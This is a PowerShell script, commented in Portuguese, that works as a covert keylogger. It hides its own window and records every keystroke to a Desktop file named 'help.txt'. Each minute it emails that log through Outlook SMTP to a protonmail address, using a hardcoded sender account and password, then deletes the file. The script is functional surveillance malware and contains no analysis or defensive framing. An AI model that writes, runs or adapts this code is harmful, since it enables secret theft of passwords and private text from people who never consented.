# Código para esconder a janela do PowerShell
$t = @"
using System;
using System.Runtime.InteropServices;

public class WinAPI
{
    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@
Add-Type -TypeDefinition $t
$handle = (Get-Process -Id $PID).MainWindowHandle
if ($handle -ne [IntPtr]::Zero) {
    [WinAPI]::ShowWindow($handle, 0)
}

# Configurações de envio de e-mail
$RunTimeP = 1 # Tempo em minutos
$From = "luccasmachado001@outlook.com"
$Pass = "hbzgnuqauqooxcbq"
$To = "carlosalberto58@protonmail.com"
$Subject = "pragmatica"
$body = "report"
$SMTPServer = "smtp-mail.outlook.com" # SMTP do Outlook
$SMTPPort = "587"
$credentials = New-Object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)

# Requer PowerShell versão 2
function Start-Helper($Path=[System.IO.Path]::Combine([System.Environment]::GetFolderPath('Desktop'), 'help.txt')) {
    $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

    $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru

    # Cria o arquivo na área de trabalho
    $null = New-Item -Path $Path -ItemType File -Force

    try {
        while ($true) {
            $TimeStart = Get-Date
            $TimeEnd = $TimeStart.AddMinutes($RunTimeP)
            while ($TimeEnd -ge (Get-Date)) {
                Start-Sleep -Milliseconds 40
                
                for ($ascii = 9; $ascii -le 254; $ascii++) {
                    $state = $API::GetAsyncKeyState($ascii)

                    if ($state -eq -32767) {
                        $null = [console]::CapsLock

                        $virtualKey = $API::MapVirtualKey($ascii, 3)

                        $kbstate = New-Object Byte[] 256
                        $checkkbstate = $API::GetKeyboardState($kbstate)

                        $mychar = New-Object -TypeName System.Text.StringBuilder

                        $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

                        if ($success) {
                            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
                        }
                    }
                }
            }
            Send-MailMessage -From $From -To $To -Subject $Subject -Body $body -Attachments $Path -SmtpServer $SMTPServer -Port $SMTPPort -Credential $credentials -UseSsl
            Remove-Item -Path $Path -Force
        }
    }
    finally {
        exit 1
    }
}

# Inicia a função
Start-Helper